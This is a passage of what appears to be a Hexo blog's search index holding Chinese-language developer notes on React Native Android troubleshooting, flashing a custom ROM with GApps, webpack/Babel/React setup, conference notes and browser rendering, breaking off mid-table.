<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[React Native踩坑调试的日常]]></title>
      <url>http://csser.work/03/21/2017/react-native-probs/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>React Native 坑有点多, 遇到问题就放这里面了<br>主要是关于Android方面的</p>
<h2 id="基本的file-structure"><a href="#基本的file-structure" class="headerlink" title="基本的file structure"></a>基本的file structure</h2><blockquote>
<p><a href="https://github.com/sunnylqm/react-native-project-structure-guide" target="_blank" rel="external">https://github.com/sunnylqm/react-native-project-structure-guide</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">beginner</span><br><span class="line">├── android</span><br><span class="line">│   ├── app</span><br><span class="line">│   │   ├── build             <span class="comment">#   output files(auto generate)</span></span><br><span class="line">│   │   │   └── *</span><br><span class="line">│   │   └── src</span><br><span class="line">│   │       └── main</span><br><span class="line">|   |            ├── java</span><br><span class="line">|   |            │   └── com-xxx      <span class="comment">#  java files</span></span><br><span class="line">|   |            |              └── *.java</span><br><span class="line">|   |            ├── res                    <span class="comment">#    resources</span></span><br><span class="line">|   |            └── AndroidManifest.xml    <span class="comment">#  android settings</span></span><br><span class="line">│   ├── build</span><br><span class="line">│   │   └── intermediates     <span class="comment">#中间件?(暂时不懂)</span></span><br><span class="line">│   │       ├── dex-cache</span><br><span class="line">│   │       └── lint-cache</span><br><span class="line">│   ├── gradle                <span class="comment">#  gradlew integration tool</span></span><br><span class="line">│   │   └── wrapper</span><br><span class="line">│   └── keystores</span><br><span class="line">├── ios                       <span class="comment">#  not for ios, ignore</span></span><br><span class="line">├── app</span><br><span class="line">│   ├── components</span><br><span class="line">│   ├── image</span><br><span class="line">│   ├── page</span><br><span class="line">│   ├── style</span><br><span class="line">│   └── utility</span><br><span class="line">├── node_modules              <span class="comment">#  relies</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><ol>
<li><p>Error: “Could not get BatchedBridge, make sure your bundle is packaged properly”<br><a href="http://stackoverflow.com/questions/38870710/error-could-not-get-batchedbridge-make-sure-your-bundle-is-packaged-properly" target="_blank" rel="external">@tbo</a></p>
</li>
<li><p>Beginner for react-native;<br><a href="https://facebook.github.io/react-native/docs/integration-with-existing-apps.html" target="_blank" rel="external">https://facebook.github.io/react-native/docs/integration-with-existing-apps.html</a></p>
<p>AndroidManifest.xml:</p>
<blockquote>
<p>APP/node_modules/react-native/ReactAndroid/src/main  </p>
</blockquote>
<p>Add native code #Section: the directory is</p>
<blockquote>
<p>APP/node_modules/react-native/ReactAndroid/src/main/java/com/facebook/react/</p>
</blockquote>
<p>APP name: <code>HelloWorld</code> Line 18 in MyReactActivity.java</p>
</li>
<li><p>In MyReactActivity.java<br>use<code>Alt + Enter</code> to add all missing imports in android-studio</p>
</li>
<li><p>In AndroidManifest.xml(path on the top) add:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">  android:name=".MyReactActivity"</span><br><span class="line">  android:label="@string/app_name"</span><br><span class="line">  android:theme="@style/Theme.AppCompat.Light.NoActionBar"&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Maybe need <code>react-native upgrade</code> at first time</p>
<blockquote>
<p><a href="https://github.com/facebook/react-native/issues/9312" target="_blank" rel="external">https://github.com/facebook/react-native/issues/9312</a></p>
</blockquote>
</li>
<li><p>Error: react-native application has not been registered<br>link:<a href="http://stackoverflow.com/questions/38340360/react-native-application-has-not-been-registered" target="_blank" rel="external">stackoverflow</a></p>
<blockquote>
<p>react-native init <br>AppRegistry.registerComponent(‘‘, () =&gt; HelloWorld);</p>
</blockquote>
<p>APPNAME should be the same.</p>
</li>
<li><p>When connecting real device, create a new terminal with this folder.Type<code>adb reverse tcp:8081 tcp:8081</code></p>
</li>
<li><p>RUN IN ANDROID(via usb):</p>
<p>a. react-native upgrade<br>b. react-native run-android<br>c. npm start(node node_modules/react-native/local-cli/cli.js start)  </p>
</li>
<li><p><a href="http://stackoverflow.com/questions/37389905/change-package-name-for-android-in-react-native" target="_blank" rel="external">Change package name for Android in React Native Ask Question</a>  </p>
<p>android/app/src/main/java/com/PROJECT_NAME/MainActivity.java: package MY.APP.ID;<br>android/app/src/main/java/com/PROJECT_NAME/MainApplication.java: package MY.APP.ID;<br>android/app/src/main/AndroidManifest.xml: package=”MY.APP.ID”<br>android/app/build.gradle: applicationId “MY.APP.ID”<br>Gradle’ cleaning in the end: ./android/gradlew clean</p>
<p>app_name: android/app/src/main/res/strings.xml<br>package_name: android/app/build.gradle -&gt; applicationID<br>app_img: android/app/src/main/res/mipmap-xxx<br>plz <code>react-native upgrade</code> after changing</p>
</li>
<li><p>when developing, we need to <code>npm start</code> again when every node_modle update.</p>
</li>
<li><p>the development server returned response error code :404</p>
</li>
<li><p><component1 props1="{variable1}" props2="{variable1}/"><br>in this Component1.js, the props has <code>props1</code> and <code>proprs2</code></component1></p>
</li>
<li><p>bug(fixed with a node module??):<br>Error while updating property ‘fontWeight’ in shadow node of typ:RCTText<br>delete: <a href="https://github.com/styled-components/styled-components/issues/210" target="_blank" rel="external">details here:</a><br>What I found is that all I would do is just <code>().toString()</code></p>
</li>
<li><p>If the app crashed, <code>react-native run-android</code>is needed again.</p>
</li>
<li><p><a href="https://github.com/marcshilling/react-native-image-picker/issues/109" target="_blank" rel="external">_this2.setState is not a function</a><br>典型的this指向问题, 两种解决方案</p>
<blockquote>
<p>origin<br>onPress={this.myFunction}</p>
<ol>
<li><code>onPress={() =&gt; this.myFunction()}</code></li>
<li><code>onPress={(this.myFunction).bind(this)}</code></li>
</ol>
</blockquote>
<p>OR: in constructor <code>this.onPress = this.onPress.bind(this)</code></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/38874083/global-text-color-and-textinput-text-color" target="_blank" rel="external">Set Global text color</a><br>Seems not working.</p>
</li>
<li><p><a href="http://stackoverflow.com/questions/30266831/hide-show-components-in-react-native" target="_blank" rel="external">button to toggle show/hide</a></p>
<blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.state.showTheThing &amp;&amp;</span><br><span class="line">  &lt;TextInput/&gt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  Then just do:</span></span><br><span class="line"><span class="keyword">this</span>.setState(&#123;showTheThing: <span class="literal">true</span>&#125;)  <span class="comment">// to show it  </span></span><br><span class="line"><span class="keyword">this</span>.setState(&#123;showTheThing: <span class="literal">false</span>&#125;) <span class="comment">// to hide it</span></span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>TranformError your/path/xx.jpg: Unexpected character’?’(1:0)<br>Just reload the package with <code>npm start</code></p>
</li>
<li><p>react native each child in an array or iterator should have a unique <code>key</code><br><a href="http://stackoverflow.com/questions/34576332/warning-each-child-in-an-array-or-iterator-should-have-a-unique-key-prop-che" target="_blank" rel="external">stackoverflow</a> As it said, add the key val for each array component.e.g. <code>&lt;Picker.item key={xxx}/&gt;</code></p>
</li>
<li><p>Image set inline</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/34142761/display-inline-equivalent-in-react-native" target="_blank" rel="external">stackoverflow</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//container style wrapper for scrollview</span></span><br><span class="line">	inlineRow: &#123;</span><br><span class="line">		flexDirection: <span class="string">'row'</span>,</span><br><span class="line">		flexWrap: <span class="string">'wrap'</span>,</span><br><span class="line">		alignItems: <span class="string">'center'</span>,</span><br><span class="line">	&#125;,</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p><a href="http://stackoverflow.com/questions/32660706/react-native-stylesheet-what-does-flex1-do" target="_blank" rel="external">ReactNative the meaning of <code>{ flex: 1 }</code></a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/33297367/100-width-in-react-native-flexbox" target="_blank" rel="external">100%width</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">line1: &#123;</span><br><span class="line">    backgroundColor: <span class="string">'#FDD7E4'</span>,</span><br><span class="line">    alignSelf: <span class="string">'stretch'</span>,</span><br><span class="line">    textAlign: <span class="string">'center'</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>OR<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  Dimensions</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">var</span> width = Dimensions.get(<span class="string">'window'</span>).width; <span class="comment">//full width</span></span><br><span class="line"><span class="keyword">var</span> height = Dimensions.get(<span class="string">'window'</span>).height; <span class="comment">//full height</span></span><br></pre></td></tr></table></figure></p>
<ol>
<li><p><a href="http://stackoverflow.com/questions/34625829/change-button-style-on-press-in-react-native" target="_blank" rel="external">Customizable button</a><br><code>TouchableHighlight</code></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/32133013/java-lang-outofmemoryerror-gc-overhead-limit-exceeded-on-android-1-4" target="_blank" rel="external">java.lang.OutOfMemoryError: GC overhead limit exceeded</a><br>android/app/build.gradle<br>add this</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">  ...</span><br><span class="line">  dexOptions &#123;</span><br><span class="line">       incremental <span class="keyword">true</span></span><br><span class="line">       javaMaxHeapSize <span class="string">"4g"</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://github.com/facebook/react-native/issues/6799" target="_blank" rel="external">java.lang.OutOfMemoryError: Java heap space</a><br>android/app/src/main/AndroidManifest.xml</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">  android:largeHeap=<span class="string">"true"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>command <code>Release apk</code> ???<br><a href="http://facebook.github.io/react-native/docs/signed-apk-android.html" target="_blank" rel="external">official</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">react-native run-android --variant=release</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="http://stackoverflow.com/questions/39123357/when-to-use-touchablenativefeedback-touchablehighlight-or-touchableopacity" target="_blank" rel="external">TouchableNativeFeedback, TouchableHighlight and TouchableOpacity</a></p>
</li>
<li><p><a href="https://github.com/facebook/react-native/blob/master/docs/Troubleshooting.md" target="_blank" rel="external">Error “code”:”ENOSPC”,”errno”:”ENOSPC”</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> fs.inotify.max_user_watches=582222 | sudo tee <span class="_">-a</span> /etc/sysctl.conf &amp;&amp; sudo sysctl -p</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>刚刚发现了markdown保证顺序输出的方法了, <code>space*n</code>就能保证处于第几级范围.<br>在行尾加上<code>space*2</code>能作为软换行(soft return)</p>
]]></content>
    </entry>
    
    <entry>
      <title></title>
      <url>http://csser.work/03/19/2017/tmp-es6-this/</url>
      <content type="html"><![CDATA[<p>再谈this</p>
<p>三个方面:</p>
<ol>
<li><p>before ES6</p>
</li>
<li><p>改进方法</p>
</li>
<li><p>ES6 - arrow function</p>
</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[第三方Rom+GAPPs安装]]></title>
      <url>http://csser.work/03/15/2017/3rd-rom-gapps/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>听说7.1.2出了个指纹move功能, 就刷了个beta版本.后来发现celluar network不能用, 然后很蠢的直接用flashfire想刷回7.1.1, 然后就崩了.然后想直接线刷回原版底包, 发现adb根本没有设备..</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><p><code>官方包无法通过第三方recory刷入</code>, 所以选择几个第三方的rom进行刷入.<br>前提: 存在第三方Recovery(如TWRP)<br>推荐几个第三方的rom:</p>
<ol>
<li>SlimRoms 2. Paranoid 3. ResurrectionRemix</li>
</ol>
<p>安装过程摸索了一下, 基本如下:</p>
<ol>
<li>Power Button + Volume Down =&gt; 选择 recovery mode</li>
<li>将第三方的包放入常用目录</li>
<li>wipe-&gt;slide<br>wipe-&gt;选择system, vendor, 两个cache</li>
<li>安装第三方rom<br>等重启, 重启完之后会发现连个浏览器都没, 然后就去找这个<a href="http://opengapps.org/" target="_blank" rel="external">gapps</a><br>重新上述步骤就行了.</li>
</ol>
<p>顺便发一个gist: <a href="https://gist.github.com/c42faa9b41a1f383b0e5b54cf4ac1636" target="_blank" rel="external">adb</a></p>
]]></content>
    </entry>
    
    <entry>
      <title></title>
      <url>http://csser.work/01/29/2017/about-learning-1/</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[jsfuck - 基础实现 A]]></title>
      <url>http://csser.work/12/28/2016/js-jsfuck-demos/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>Codewars上遇到一道问题, 刚好能用这个解.<br>重新看了一下, 有新的领悟, 索性把实现写一下</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><h2 id="Refer-amp-Recommend"><a href="#Refer-amp-Recommend" class="headerlink" title="Refer &amp; Recommend"></a>Refer &amp; Recommend</h2><p><a href="http://thomas-yang.me/projects/oh-my-dear-js/" target="_blank" rel="external">js - 等价比较</a><br><a href="https://github.com/aemkei/jsfuck/blob/master/jsfuck.js" target="_blank" rel="external">jsfuck - typecast(类型转换)</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[VisuAlgo - Quick Sort]]></title>
      <url>http://csser.work/12/22/2016/visualgo-quick-sort/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>先安利 ==&gt; <a href="https://visualgo.net/" target="_blank" rel="external">VisualGo</a><br>表示这学期到下学期会以这个为一个小专题把基础的算法写一遍, 前端也是要会算法的!</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p>//  TODO</p>
<p>##</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[代码时间-余凡演讲听记]]></title>
      <url>http://csser.work/12/21/2016/exp-codetime-AlbertYu/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>从<a href="https://gold.xitu.io" target="_blank" rel="external">@掘金</a>上瞄到的, 发现路上可以听, 听完再搞个笔记.</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br> <br> <br> <br></p>
<blockquote>
<p>Albert Yu<br>HTTP很重要<br>英语很重要 //    ps:和tinyfool一样~<br>正处于飞速发展的阶段的前端, 个人眼界比什么都重要  </p>
</blockquote>
<p>思考方向:<br>面对繁多的框架, 理解框架解决什么问题, 横向比较框架中对细节问题的实现方式更优雅<br>对底层技术的优劣进行比较</p>
<p>然后推荐的两本书:<br><a href="http://download.csdn.net/download/narutolby/4494805" target="_blank" rel="external">HTTP Developer’s Handbook</a> 这本在google book能直接搜到<br><a href="https://www.gitbook.com/book/frontendmasters/front-end-handbook/details" target="_blank" rel="external">Front-end Handbook</a></p>
<p>已加入读书队列并放在了队首= =</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>原文地址: <a href="https://codetimecn.com/episodes/how-to-learn" target="_blank" rel="external">如何学习前端 - 余凡</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[webpack react jsx babel]]></title>
      <url>http://csser.work/12/21/2016/webpack-react/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>Learn from: <a href="https://www.codementor.io/tamizhvendan/tutorials/beginner-guide-setup-reactjs-environment-npm-babel-6-webpack-du107r9zr" target="_blank" rel="external">https://www.codementor.io/tamizhvendan/tutorials/beginner-guide-setup-reactjs-environment-npm-babel-6-webpack-du107r9zr</a>, some error had been corrected.</p>
<p>This is a note for learning webpack + react + jsx + babel loader</p>
<h2 id="webpack-config-js"><a href="#webpack-config-js" class="headerlink" title="webpack.config.js"></a>webpack.config.js</h2><p>The <code>APP_DIR</code> holds the directory path of the React application’s codebase. The <code>BUILD_DIR</code> represents the directory path of the bundle file output.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> BUILD_DIR = path.resolve(__dirname, <span class="string">'src/client/public'</span>);</span><br><span class="line"><span class="keyword">var</span> APP_DIR = path.resolve(__dirname, <span class="string">'src/client/app'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  entry: APP_DIR + <span class="string">'/index.jsx'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: BUILD_DIR,</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure>
<h2 id="generate-a-bundle-js"><a href="#generate-a-bundle-js" class="headerlink" title="generate a bundle.js"></a>generate a bundle.js</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ webpack <span class="_">-d</span></span><br></pre></td></tr></table></figure>
<h2 id="With-Bable"><a href="#With-Bable" class="headerlink" title="With Bable"></a>With Bable</h2><p>install</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i babel-core babel-loader babel-preset-es2015 babel-preset-react -S</span><br></pre></td></tr></table></figure>
<p>settings</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"presets"</span> : [</span><br><span class="line">        <span class="string">"es2015"</span>,</span><br><span class="line">        <span class="string">"react"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>webpack.config.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Existing Code ....</span></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="comment">// Existing Code ....</span></span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    loaders: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        include: APP_DIR,</span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        loader: <span class="string">'babel'</span>,</span><br><span class="line">        query:</span><br><span class="line">        &#123;</span><br><span class="line">          presets: [<span class="string">'react'</span>, <span class="string">'es2015'</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="With-React"><a href="#With-React" class="headerlink" title="With React"></a>With React</h2><p>npm</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm i react react-dom -S</span><br></pre></td></tr></table></figure>
<p>index.jsx(<a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Statements/import" target="_blank" rel="external">import module</a>)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;render&#125; <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Watchman-for-jsx-amp-amp-React-Hot-Loader"><a href="#Watchman-for-jsx-amp-amp-React-Hot-Loader" class="headerlink" title="Watchman for jsx &amp;&amp; React Hot Loader"></a>Watchman for jsx &amp;&amp; <a href="http://gaearon.github.io/react-hot-loader/getstarted/" target="_blank" rel="external">React Hot Loader</a></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ webpack <span class="_">-d</span> --watch</span><br></pre></td></tr></table></figure>
<p>react-hot-loader</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install react-hot-loader --save-dev</span><br></pre></td></tr></table></figure>
<p>config: should click the click to learn more!</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">  loaders: [</span><br><span class="line">    &#123; test: <span class="regexp">/\.jsx?$/</span>, loaders: [<span class="string">'react-hot'</span>, <span class="string">'jsx?harmony'</span>], include: path.join(__dirname, <span class="string">'src'</span>) &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="npm-package-verb"><a href="#npm-package-verb" class="headerlink" title="npm package(verb.)"></a>npm package(verb.)</h2><p>package.json<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"script"</span>: &#123;</span><br><span class="line">    <span class="attr">"dev"</span>: <span class="string">"webpack -d --watch"</span>,</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"webpack -p"</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>usage:<br><code>npm run dev</code>, <code>npm run build</code></p>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>Webapack is a wonderful tool!</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[SFDC2016_小记]]></title>
      <url>http://csser.work/12/12/2016/sfdc2016/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>昨天晚上被拉到哥哥家做伴郎去了Orz…小记今天写.<br>陪同有两个小伙伴(server side= =)</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><p>这边只写一些片段了, 写的离散.<br>贺老这个图一定得放~hhh<br><img src="/imgs/conferences/sfdc/2016_1.jpg" alt="javascriptBest"></p>
<h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><p>Microsoft<br>    Chakr TS RX<br>    win10 HWA</p>
<p>Google<br>    PWA polyman 框架</p>
<p>Facebook<br>    Nuclide  </p>
<p>Ocamel<br>PWA 我是出品人<br>Immutable.js elm redux<br>ES6 Async/Await<br>Cycle.js<br>物联网 mqtt.js</p>
<p>《the state of js》(book)</p>
<p>Growth hacking:<br>    协程 子例程</p>
<h3 id="前端会场"><a href="#前端会场" class="headerlink" title="前端会场"></a>前端会场</h3><ol>
<li><p>weex DSL virtual dom back side<br>开发实践： tree降低层级<br>weex以后会插件化</p>
</li>
<li><p>angular js 浏览器颤动</p>
</li>
<li><p>vue 离线化 service worker cache localStorage<br>css 组件化可以不用 css预编译</p>
</li>
<li><p>前端性能优化 - 又多又棒~<br>性能 网络性能 和 运行时性能<br>http2 服务端推送<br>RTT(Round-trip delay time)</p>
</li>
</ol>
<p>图片懒加载 移动网络 根据页面来判断是否scroll</p>
<p>webpack</p>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>顺便吐个槽, 前端会场200+的人, 通风不给力导致全程短袖听演讲.<br>还有为什么不采用合理的Time plan来开会, 虽然讲完但并不能保证效率诶诶诶,中途Echart那场就打瞌睡了(然后小伙伴说可能就是不用所有都听…)</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[浏览器渲染/性能优化]]></title>
      <url>http://csser.work/12/04/2016/browser-render/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>前天看到的一篇文章<a href="https://segmentfault.com/a/1190000004292479" target="_blank" rel="external">JS 一定要放在 Body 的最底部么？聊聊浏览器的渲染机制 - 德来</a><br>讲的一个浏览器渲染的文章, 看完发现作者写了一个小项目=&gt;<a href="https://github.com/youzan/tiny-loader.js/blob/master/loader.js" target="_blank" rel="external">tiny-loader.js</a>, 然后发现前一个月自己也刚刚写了一个轮子(不是很好用= =), 本文由此而来.</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p><br><br><br><br><br><br><br><br>这边记录一下浏览器的渲染机制/顺序</p>
<h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><p>照着以前的图画的(直接下载看高清):<br><img src="/imgs/howBrowserWork/render-process.png" alt="browser-render"></p>
<h3 id="渲染步骤-简"><a href="#渲染步骤-简" class="headerlink" title="渲染步骤(简)"></a>渲染步骤(简)</h3><p>照图颜色说话:</p>
<ol>
<li>先通过 HTML/SVG/XHTML 生成一个基本的DOM树, <code>并行</code>发起css, img, js请求, <code>和是否在HEAD标签无关</code></li>
<li>CSS下载完成, 开始构建CSSOM(object model)树, 结构和dom相对应</li>
<li>所有CSS均下载完毕, CSSOM构建完成后, 和DOM相互匹配进行渲染(render), 生成Rendering Tree<br>┏ —————— ┓</li>
<li>Layout: 将树的节点根据自己所拥有的CSS进行定位(计算所处位置)</li>
<li>Painting: 知道了摆放位置和样式了, 之后就是内容填充了, 利用显卡把内容显示在浏览器中.<br>┗ —循环操作— ┛</li>
</ol>
<p>reflow和repaint可以参考refer</p>
<h3 id="document-readyState"><a href="#document-readyState" class="headerlink" title="document.readyState"></a>document.readyState</h3><p>从tiny-loader这边才知道每个dom节点都有readyState这个属性</p>
<blockquote>
<p><a href="http://www.findmeat.org/tutorials/javascript/x562392.htm" target="_blank" rel="external">JavaScript Programmer’s Reference</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>State</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>uninitialized</td>
<td>The object is first instantiated but has not begun loading.</td>
</tr>
<tr>
<td>loading</td>
<td>The object has commenced loading.</td>
</tr>
<tr>
<td>loaded</td>
<td>The object has completed loading.</td>
</tr>
<tr>
<td>interactive</td>
<td>The object is loaded but not yet closed but is ready to handle interaction.</td>
</tr>
<tr>
<td>complete</td>
